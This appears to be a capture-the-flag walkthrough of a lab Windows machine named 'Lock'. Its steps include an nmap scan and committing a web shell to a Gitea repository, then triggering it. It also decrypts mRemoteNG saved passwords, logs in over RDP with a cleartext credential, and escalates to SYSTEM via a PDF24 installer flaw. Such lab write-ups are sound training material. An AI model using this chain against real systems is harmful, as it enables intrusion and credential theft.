
![[lock logo.png]]


We scan the target

```
nmap -sVC 10.129.33.51 -oN scan.txt
```
```
<SNIP>

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=442b955c5285056a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=ZmlK3WdLgv86XzG5wJquEK32GZg6MTc2NzcxMTk3Nzk5NDg3OTQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 06 Jan 2026 15:06:19 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=9db1c8f18dddfa2f; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=6XN8XTxq_mv1NNcaQSZVFGCORHw6MTc2NzcxMTk4NDY5NTkxMjEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 06 Jan 2026 15:06:24 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-06T15:08:25+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-01-05T15:02:22
|_Not valid after:  2026-07-07T15:02:22
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-06T15:07:45+00:00

<SNIP>
```


![Pasted image 20260106161405](Pasted%20image%2020260106161405.png)

![Pasted image 20260106161418](Pasted%20image%2020260106161418.png)


![Pasted image 20260106161656](Pasted%20image%2020260106161656.png)

![Pasted image 20260106161715](Pasted%20image%2020260106161715.png)


![Pasted image 20260106161741](Pasted%20image%2020260106161741.png)



![Pasted image 20260106162839](Pasted%20image%2020260106162839.png)



![Pasted image 20260106203259](Pasted%20image%2020260106203259.png)

![Pasted image 20260106203324](Pasted%20image%2020260106203324.png)


![Pasted image 20260106203357](Pasted%20image%2020260106203357.png)

```
git config --global user.name "ellen.freeman"
```
```
git config --global user.email "ellen.freeman"
```
```
git add shell.aspx
```
```
git commit -m "test"
```
```
git push
```


```
curl http://10.129.234.64/rev.aspx
```

![Pasted image 20260106203620](Pasted%20image%2020260106203620.png)


![Pasted image 20260106204652](Pasted%20image%2020260106204652.png)


https://github.com/gquere/mRemoteNG_password_decrypt


```
wget https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py
```

```
python3 mremoteng_decrypt.py config.xml
```

![Pasted image 20260106204727](Pasted%20image%2020260106204727.png)


```
xfreerdp /u:"Gale.Dekarios" /p:"ty8wnW9qCKDosXo6" /v:"10.129.33.51" /dynamic-resolution
```

![Pasted image 20260106211330](Pasted%20image%2020260106211330.png)

![Pasted image 20260106211352](Pasted%20image%2020260106211352.png)

https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/

```
wget https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z
```

![Pasted image 20260106211140](Pasted%20image%2020260106211140.png)

![Pasted image 20260106212832](Pasted%20image%2020260106212832.png)

![Pasted image 20260106212901](Pasted%20image%2020260106212901.png)

![Pasted image 20260106213002](Pasted%20image%2020260106213002.png)

Open with Firefox

Then, we press `CTRL + o` and we type `cmd.exe`. After the download we open the cmd.exe file and we should have a system cmd.

![Pasted image 20260106213303](Pasted%20image%2020260106213303.png)